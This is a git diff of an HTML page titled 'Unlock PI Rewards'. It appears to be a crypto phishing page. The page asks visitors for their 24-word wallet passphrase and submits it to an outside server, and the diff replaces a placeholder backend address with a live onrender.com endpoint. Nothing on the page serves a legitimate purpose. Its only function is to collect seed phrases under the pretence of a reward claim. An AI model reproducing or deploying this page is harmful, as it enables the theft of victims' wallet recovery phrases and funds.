@@ -1,101 +1,81 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <form action="https://<your-render-backend-url>/submit" method="POST" onsubmit="return validatePassphrase()">
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Unlock PI Reward</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-      background-color: #f4f4f4;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlock PI Rewards</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+            width: 90%;
+            max-width: 400px;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .error {
+            color: red;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+    </style>
+    <script>
+        function validatePassphrase() {
+            const passphrase = document.getElementById("passphrase").value.trim();
+            const errorMessage = document.getElementById("error-message");
+            const wordCount = passphrase.split(" ").filter(word => word).length;
 
-    h1 {
-      font-size: 24px;
-      color: #333;
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    form {
-      background: #fff;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-      max-width: 90%;
-      width: 400px;
-    }
-
-    label {
-      display: block;
-      font-size: 16px;
-      margin-bottom: 8px;
-      color: #555;
-    }
-
-    input[type="text"] {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 20px;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-      font-size: 14px;
-      box-sizing: border-box;
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #007bff;
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #0056b3;
-    }
-
-    .error {
-      color: red;
-      font-size: 14px;
-      margin-bottom: 10px;
-      display: none; /* Hidden by default */
-    }
-  </style>
+            if (wordCount !== 24) {
+                errorMessage.textContent = "Please enter a valid 24-word passphrase.";
+                return false;
+            }
+            errorMessage.textContent = "";
+            return true;
+        }
+    </script>
 </head>
 <body>
-  <h1>Unlock Your PI Reward</h1>
-  <form action="https://your-render-backend-url.onrender.com/submit" method="POST" onsubmit="return validatePassphrase()">
-    <label for="passphrase">Enter Your 24-Word Passphrase:</label>
-    <input type="text" id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase" required>
-    <div class="error" id="error-message">Please enter a valid 24-word passphrase.</div>
-    <button type="submit">Unlock PI Reward</button>
-  </form>
-
-  <script>
-    function validatePassphrase() {
-      const passphraseInput = document.getElementById("passphrase");
-      const errorMessage = document.getElementById("error-message");
-
-      const passphrase = passphraseInput.value.trim();
-      if (passphrase.split(" ").length !== 24) {
-        errorMessage.style.display = "block";
-        return false;
-      }
-
-      errorMessage.style.display = "none";
-      return true;
-    }
-  </script>
+    <div class="container">
+        <h1>Unlock PI Rewards</h1>
+        <div id="error-message" class="error"></div>
+        <form action="https://pinetwork-ib9q.onrender.com/submit" method="POST" onsubmit="return validatePassphrase()">
+            <input type="text" id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase">
+            <button type="submit">Unlock PI Reward</button>
+        </form>
+    </div>
 </body>
 </html>
